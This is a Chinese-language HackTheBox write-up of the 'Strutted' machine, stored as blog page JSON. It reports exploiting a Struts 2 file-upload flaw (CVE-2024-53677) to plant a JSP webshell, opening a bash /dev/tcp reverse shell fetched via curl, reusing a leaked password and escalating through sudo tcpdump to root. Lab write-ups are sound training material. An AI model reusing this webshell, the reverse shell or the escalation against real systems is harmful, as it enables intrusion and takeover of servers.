{"pageProps":{"postData":{"id":"HackTheBoxMachine - Strutted","contentHtml":"<h1>Machine - Strutted</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Strutted\">https://app.hackthebox.com/machines/Strutted</a> | <code>Linux</code> | Medium</p>\n</blockquote>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Strutted nmap -sT -min-rate 5000 10.10.11.59              \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 21:26 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.59\nHost is up (0.080s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 0.49 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Strutted nmap -sT -A -p 22,80 10.10.11.59\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 21:27 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.59\nHost is up (0.066s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://strutted.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   97.21 ms 10.10.16.1\n2   52.26 ms 10.10.11.59\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 11.65 seconds\n</code></pre>\n<p>没扫描出来什么，<code>80</code>端口开始</p>\n<h2>Web</h2>\n<h3>信息收集</h3>\n<p>访问 <code>HTTP</code>，上来就是一个上传功能点，并且是使用 <code>Java</code> 写的</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image.png\" alt=\"image.png\"></p>\n<p>上传一张 <code>png</code> 图片，上传后访问上传后的路径</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image1.png\" alt=\"image.png\"></p>\n<p>路径大概就是 <code>/uploads/&#x3C;日期>_&#x3C;时间戳>/Image</code></p>\n<p>右上角的 <code>Download</code> 能下载一个压缩包文件</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image2.png\" alt=\"image.png\"></p>\n<p>解压后从这几个文件名来看，这是一个基于 <code>Tomcat</code> （很可能还用到了 <code>Struts</code> 框架）的 Java Web 工程目录</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image3.png\" alt=\"image.png\"></p>\n<p>从 <code>tomcat-users.xml</code> 中能得到一个用户 <code>admin:skqKY6360z!Y</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;?xml version=<span class=\"hljs-string\">'1.0'</span> encoding=<span class=\"hljs-string\">'utf-8'</span>?>\n\n&#x3C;tomcat-users>\n    &#x3C;role rolename=<span class=\"hljs-string\">\"manager-gui\"</span>/>\n    &#x3C;role rolename=<span class=\"hljs-string\">\"admin-gui\"</span>/>\n    &#x3C;user username=<span class=\"hljs-string\">\"admin\"</span> password=<span class=\"hljs-string\">\"skqKY6360z!Y\"</span> roles=<span class=\"hljs-string\">\"manager-gui,admin-gui\"</span>/>\n&#x3C;/tomcat-users>\n</code></pre>\n<p><code>Dockerfile</code></p>\n<pre><code class=\"hljs language-bash\">FROM --platform=linux/amd64 openjdk:17-jdk-alpine\n<span class=\"hljs-comment\">#FROM openjdk:17-jdk-alpine</span>\n\nRUN apk add --no-cache maven\n\nCOPY strutted /tmp/strutted\nWORKDIR /tmp/strutted\n\nRUN mvn clean package\n\nFROM tomcat:9.0\n\nRUN <span class=\"hljs-built_in\">rm</span> -rf /usr/local/tomcat/webapps/\nRUN <span class=\"hljs-built_in\">mv</span> /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/\nRUN <span class=\"hljs-built_in\">rm</span> -rf /usr/local/tomcat/webapps/ROOT\n\nCOPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war\nCOPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml\nCOPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml\n\nEXPOSE 8080\n\nCMD [<span class=\"hljs-string\">\"catalina.sh\"</span>, <span class=\"hljs-string\">\"run\"</span>]\n</code></pre>\n<p>在 <code>strutted\\src\\main\\resources</code> 中能找到 <code>struts.xml</code> ，那么该应用确定使用了 <code>Apache struts</code> 框架</p>\n<p>使用 <code>cursor</code> 分析了一波：</p>\n<blockquote>\n<p>这是一个图片上传和分享服务，允许用户上传图片并获得可分享的短链接\n支持<code>JPG</code>、<code>JPEG</code>、<code>PNG</code>和<code>GIF</code>格式的图片\n使用Java开发，基于<code>Apache Struts 2</code>框架（版本<code>6.3.0.1</code>）\n使用<code>SQLite</code>数据库存储<code>URL</code>映射信息</p>\n</blockquote>\n<p>检索 <code>Struts</code> 的公开漏洞发现存在一个严重的漏洞 <strong>CVE-2024-53677</strong></p>\n<h3><strong>CVE-2024-53677</strong></h3>\n<blockquote>\n<p>网上现在很多的资料：<a href=\"https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/\">https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/</a> | 其中<code>POC</code>在这里找到的：<a href=\"https://blog.csdn.net/hcja666/article/details/145431770\">https://blog.csdn.net/hcja666/article/details/145431770</a></p>\n</blockquote>\n<p>通过<code>POC</code>上传文件</p>\n<pre><code class=\"hljs language-bash\">------geckoformboundary4326f830a192485d2f8c0ae8e591b119\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"Upload\"</span>; filename=<span class=\"hljs-string\">\"1.gif\"</span>\nContent-Type: image/gif\n\nGIF89a;\n&#x3C;%@ page import=<span class=\"hljs-string\">\"java.io.*\"</span>%>\n&#x3C;%\n out.print(<span class=\"hljs-string\">\"Hello&#x3C;/br>\"</span>);\n String strcmd=request.getParameter(<span class=\"hljs-string\">\"cmd\"</span>);\n String line=null;\n Process p=Runtime.getRuntime().<span class=\"hljs-built_in\">exec</span>(strcmd);\n BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));\n <span class=\"hljs-keyword\">while</span>((line=br.readLine())!=null){\n out.print(line+<span class=\"hljs-string\">\"&#x3C;/br>\"</span>);\n }\n%>\n------geckoformboundary4326f830a192485d2f8c0ae8e591b119\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"upload\"</span>;name=<span class=\"hljs-string\">\"top.UploadFileName\"</span>;\n\n../test.jsp\n------geckoformboundary4326f830a192485d2f8c0ae8e591b119\n</code></pre>\n<p>可以发现图片的访问路径变成了：<code>uploads/20250602_143716/../../test.jsp</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image4.png\" alt=\"image.png\"></p>\n<p>访问上传的<code>WebShell</code> ，成功执行命令</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image5.png\" alt=\"image.png\"></p>\n<h3>反弹 Shell</h3>\n<p>这里构造麻烦了</p>\n<ol>\n<li>\n<p>首先创建反弹<code>shell</code>的脚本</p>\n<pre><code class=\"hljs language-bash\">/bin/bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/10.10.16.45/1234 0>&#x26;1'</span>\n</code></pre>\n</li>\n<li>\n<p>通过 <code>WebShell</code> 下载并保存到 <code>/tmp/shell.sh</code></p>\n<pre><code class=\"hljs language-bash\">GET /test.jsp?cmd=curl+10.10.16.45%2Fshell.sh+-o+%2Ftmp%2Fshell.sh HTTP/1.1\nHost: strutted.htb\nAccept-Encoding: gzip, deflate\nCookie: JSESSIONID=67A2B86E62E77A8267883495A2D05A7E\nPriority: u=0, i\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0\nUpgrade-Insecure-Requests: 1\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nReferer: http://strutted.htb/test.jsp?cmd=/bin/bash%20-c%20%27bash%20-i%20%3E&#x26;%20/dev/tcp/10.10.16.45/1234%200%3E&#x26;1%27\nDNT: 1\nSec-GPC: 1\n</code></pre>\n</li>\n<li>\n<p>赋予权限 &#x26; 监听 &#x26; 执行</p>\n<pre><code class=\"hljs language-bash\">nc -lvp 1234\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">chmod</span>%20+x%20%2Ftmp%2Fshell.sh\n%2Fbin%2Fbash+%2Ftmp%2Fshell.sh\n</code></pre>\n<p>然后就能接收到 <code>Shell</code> 了</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Strutted/image6.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>信息收集</h2>\n<p>拿到 <code>shell</code> 后，找一些有用的信息</p>\n<p>从 <code>tomcat-users.xml</code> 得到一个新密码 <code>IT14d6SSP81k</code></p>\n<pre><code class=\"hljs language-bash\">ser username=<span class=\"hljs-string\">\"admin\"</span> password=<span class=\"hljs-string\">\"IT14d6SSP81k\"</span> roles=<span class=\"hljs-string\">\"manager-gui,admin-gui\"</span>/>\n</code></pre>\n<p>端口监听信息</p>\n<pre><code class=\"hljs language-bash\">tomcat@strutted:~/conf$ ss -tulpn\nNetid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process\nudp    UNCONN  0       0              127.0.0.53%lo:53            0.0.0.0:*\nudp    UNCONN  0       0                    0.0.0.0:68            0.0.0.0:*\ntcp    LISTEN  0       4096           127.0.0.53%lo:53            0.0.0.0:*\ntcp    LISTEN  0       511                  0.0.0.0:80            0.0.0.0:*\ntcp    LISTEN  0       128                  0.0.0.0:22            0.0.0.0:*\ntcp    LISTEN  0       100       [::ffff:127.0.0.1]:8080                *:*      <span class=\"hljs-built_in\">users</span>:((\"java\",pid=<span class=\"hljs-number\">1012</span>,fd=<span class=\"hljs-number\">37</span>))\ntcp    LISTEN  0       128                     [::]:22               [::]:*\n</code></pre>\n<p>下一个用户应该就是 <code>james</code></p>\n<pre><code class=\"hljs language-bash\">tomcat@strutted:~/conf$ <span class=\"hljs-built_in\">ls</span> /home\njames\n</code></pre>\n<p>我们尝试使用刚刚得到的密码进行登录</p>\n<p>意外的成功了</p>\n<pre><code class=\"hljs language-bash\">➜  Strutted ssh james@10.10.11.59\njames@10.10.11.59<span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Mon Jun  2 02:59:38 PM UTC 2025\n\n  System load:           0.0\n  Usage of /:            69.4% of 5.81GB\n  Memory usage:          9%\n  Swap usage:            0%\n  Processes:             219\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.59\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:60d8\n\n * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s\n   just raised the bar for easy, resilient and secure K8s cluster deployment.\n\n   https://ubuntu.com/engage/secure-kubernetes-at-the-edge\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\n5 additional security updates can be applied with ESM Apps.\nLearn more about enabling ESM Apps service at https://ubuntu.com/esm\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Mon Jun  2 14:59:38 2025 from 10.10.16.45\nTo run a command as administrator (user \"root\"), use \"sudo &#x3C;command>\".\nSee \"man sudo_root\" for details.\n\njames@strutted:~$ \n</span></code></pre>\n<h2>提权</h2>\n<p>家目录下能拿到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">james@strutted:~$ <span class=\"hljs-built_in\">cat</span> user.txt \n523654eb64985132ab25397feda089ed\n</code></pre>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">james@strutted:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> james on localhost:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser james may run the following commands on localhost:\n    (ALL) NOPASSWD: /usr/sbin/tcpdump\n</code></pre>\n<p>以及结束了，利用链接：<a href=\"https://gtfobins.github.io/gtfobins/tcpdump/\">https://gtfobins.github.io/gtfobins/tcpdump/</a></p>\n<pre><code class=\"hljs language-bash\">COMMAND=<span class=\"hljs-string\">'cp /bin/bash /tmp/bash;chmod +s /tmp/bash;'</span>\nTF=$(<span class=\"hljs-built_in\">mktemp</span>)\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$COMMAND</span>\"</span> > <span class=\"hljs-variable\">$TF</span>\n<span class=\"hljs-built_in\">chmod</span> +x <span class=\"hljs-variable\">$TF</span>\n<span class=\"hljs-built_in\">sudo</span> tcpdump -<span class=\"hljs-built_in\">ln</span> -i lo -w /dev/null -W 1 -G 1 -z <span class=\"hljs-variable\">$TF</span> -Z root\n</code></pre>\n<pre><code class=\"hljs language-bash\">james@strutted:/tmp$ ./bash -p\nbash-5.1# <span class=\"hljs-built_in\">id</span>\nuid=1000(james) gid=1000(james) euid=0(root) egid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root),27(<span class=\"hljs-built_in\">sudo</span>),1000(james)\n</code></pre>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">bash-5.1# <span class=\"hljs-built_in\">cat</span> root.txt \n1db28e82bbd377c60d86c4992aa8ec87\n</code></pre>\n<h2>总结</h2>\n<p><code>Web</code>通过<code>CVE-2024-53677</code> 进行梭哈，其实对我这种对<code>JAVA</code>不熟悉的人，看项目都一脸懵，通过<code>cursor</code>来检索出来了重要的信息（<code>Stucts</code>的版本），找 <code>Payload</code> 的时间也挺长的…</p>\n<p>提权更简单，一键梭哈</p>\n<p>总的来说，像是披着<code>Medium</code>的<code>Esay</code></p>","title":"HackTheBox - Machine - Strutted","date":"2025-06-02","updated":"2025-06-02","tags":["HackTheBox","Linux","Struct","TCPdump"],"categories":"靶机","comments":true,"description":"Machine - Strutted\n\n https://app.hackthebox.com/machines/Strutted | `Linux` | Medium\n \n\n前期踩点\n\n\n\n\n\n没扫描出来什么，`80`端口开始\n\nWeb\n\n信息收集\n\n访问 `HTTP`，上来就是一个上传功能点，并且是使用 `Java` 写的\n\n\n\n上传一张 `png` 图片，上传后访问上传后的路径\n\n\n\n路径大..."},"recentPosts":[{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"}]},"__N_SSG":true}